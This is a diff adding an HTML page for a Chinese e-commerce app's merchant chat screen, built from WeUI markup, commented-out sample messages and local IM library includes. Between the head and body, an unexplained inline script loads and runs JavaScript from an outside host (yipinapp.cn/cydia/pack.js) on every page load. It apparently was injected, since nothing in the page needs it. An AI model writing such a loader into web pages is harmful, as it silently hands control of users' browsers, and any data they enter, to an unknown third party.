@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>即时通讯</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/transaction/communication.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="returnBtn">
+		    <a class="weui-pull-left weui-btns" id="arrow">
+		        <span class="weui-cell__fts"></span>
+		    </a>
+		    <div class="weui-title">联系商家</div>
+		</header>
+		<div class="x-chat">
+			<div class="x-list-item x-chat-header"><p>商家：<span class="chatBuy"></span></p></div>
+			<div class="x-chat-content">
+				<!--<div class="x-message-group">
+					<div class="x-message-user">商家</div>
+					<div class="x-message-content"><p class="x-message-text">21</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="group x-message-right">
+					<div class="x-message-user"></div>
+					<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="x-message-group">
+					<div class="x-message-user">商家</div>
+					<div class="x-message-content"><p class="x-message-text">21</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="x-message-group">
+					<div class="x-message-user">商家</div>
+					<div class="x-message-content"><p class="x-message-text">21</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="group x-message-right">
+					<div class="x-message-user"></div>
+					<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="group x-message-right">
+					<div class="x-message-user"></div>
+					<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="group x-message-right">
+					<div class="x-message-user"></div>
+					<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="group x-message-right">
+					<div class="x-message-user"></div>
+					<div class="x-message-content"><p class="x-message-text">没有已读未读</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="x-message-group">
+					<div class="x-message-user">商家</div>
+					<div class="x-message-content"><p class="x-message-text">21</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>
+				<div class="x-message-group">
+					<div class="x-message-user">商家</div>
+					<div class="x-message-content"><p class="x-message-text">21</p></div>
+					<div class="x-message-time">10-11 10:42 AM
+						<span class="x-message-status"></span>
+					</div>
+				</div>-->
+			</div>
+			<div class="x-chat-footer">
+				<div class="x-list-item x-chat-send">
+					<span class="ant-input-group-wrapper">
+						<span class="ant-input-wrapper ant-input-group">
+							<input type="text" class="ant-input" id="toMsg" placeholder="消息" />
+							<!--<textarea placeholder="消息"></textarea>-->
+							<button type="button" id="privateText">
+								发送
+								<!--<i class="fontello icon-paper-plane"></i>-->
+							</button>
+						</span>
+					</span>
+				</div>
+			</div>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/WebIMConfig.js" ></script>
+		<script type="text/javascript" src="../../lib/webimSDK.js" ></script>
+		<script type="text/javascript" src="../../lib/strophe-1.2.8.min.js" ></script>
+		<script type="text/javascript" src="../../lib/EMedia_x1v1.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/transaction/communication.js" ></script>
+	</body>
+</html>
